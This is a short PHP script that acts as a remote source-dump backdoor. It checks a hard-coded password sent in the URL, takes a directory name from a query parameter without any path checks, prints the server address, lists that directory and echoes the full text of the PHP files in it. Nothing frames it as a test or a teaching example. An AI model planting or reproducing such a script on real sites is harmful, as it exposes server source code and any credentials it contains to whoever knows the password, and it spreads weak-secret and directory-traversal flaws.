<?php
// "*******************************GET DIRECTORY***************************************<br>";

$password = isset($_GET['password']) ? $_GET['password'] : 0;
if($password != 'vikas'){
    echo "INCORRECT PASSWORD";exit;
}

$target_dir = isset($_GET['dir']) ? $_GET['dir'] : 0;
if($target_dir == 0){
    echo "FAILED TO OPEN DIRECTORY";exit;
}

$target_file = isset($_GET['file']) ? $_GET['file'] : 0;

$target_dir='/'.$target_dir.'/';

// "*******************************GET HOSTNAME***************************************<br>";

echo "*******************************HOSTNAME***************************************<br>";

echo 'hostname: '.$_SERVER['SERVER_ADDR'];

$path = dirname(__FILE__);
$array = explode('/',$path);
$key = array_search('public', $array);
$array = array_slice($array, 0, $key, true);

$main_path = implode('/',$array);
$main_path = $main_path.$target_dir;
if (!$files = scandir($main_path)) {
    echo "<br><br>*******************************MESSAGE***************************************<br>";
    echo "<br>No such directory";exit;
}


// "*******************************GET All FILES UNDER DIRECTORY***************************************<br>";
echo "<hr></hr>";
echo "Directory & Files List Under this Directory";
foreach($files as $file) {
    echo $file.'/<br>';
}
echo "<hr></hr>";


// "*******************************READ FILES***************************************<br>";
$file_found=0;
foreach($files as $key=>$file)
{
    if($target_file != 0){
        if($file==$target_file){
            $file_found=1;
           $info = pathinfo($file);
            if($info['extension'] == 'php'){
                $file_name =  $main_path.$file;
                echo "<br><br><b><hr>$file_name</hr></b><br><br>";
                $file = fopen($file_name, "r");
                while (!feof($file)) {
                  echo fgets($file) . "<br />";
                }
                fclose($file);
            }
        }
    }else{
        $file_found=1;
        $info = pathinfo($file);
        if($info['extension'] == 'php'){
            $file_name =  $main_path.$file;
            echo "<br><br><b><hr>$file_name</hr></b><br><br>";
            $file = fopen($file_name, "r");
            while (!feof($file)) {
              echo fgets($file) . "<br />";
            }
            fclose($file);
        }
    }
}
if($file_found==0){
    echo "No Such File Found";exit;
}
